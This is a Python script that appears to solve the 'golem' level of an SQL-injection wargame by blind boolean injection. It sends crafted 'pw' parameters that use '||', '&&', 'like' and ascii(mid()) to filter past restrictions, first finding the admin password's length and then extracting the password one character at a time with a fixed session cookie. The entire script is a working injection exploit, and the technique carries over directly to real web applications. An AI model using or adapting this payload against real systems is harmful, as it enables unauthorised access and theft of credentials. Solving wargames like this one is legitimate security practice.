import requests, urllib

url = "https://los.eagle-jump.org/golem_39f3348098ccda1e71a4650f40caa037.php"

cookie = {"PHPSESSID":"oj8l6aabt4juigeiduqcn1jl73"}

### get password length ###

plen = 1
while True:
    param = {"pw": "a' || id like 'admin' && length(pw) like " + str(plen) + "-- -"}
    response = requests.get(url, params=param, cookies=cookie)
    if "<h2>Hello admin</h2>" in response.text:
        break
    else:
        print("[*] trying get password length.. now " + str(plen))
        plen += 1

print("[*] Password length is " + str(plen))

password = ""

for i in range(plen):
    for j in range(256):
        j = (j + 32) % 256
        param = {"pw": "a' || id like 'admin' && ascii(mid(pw, " + str(i+1) + ", 1)) like " + str(j) +"-- -"}
        response = requests.get(url, params=param, cookies=cookie)
        if "<h2>Hello admin</h2>" in response.text:
            password += chr(j)
            break
        else:
            print("[*] searching " + str(i+1) + " password character.. now " + str(j))
            plen += 1
    print("[*] found password " + str(i+1) +" character! now : " + password)

print("[*] password is " + password)
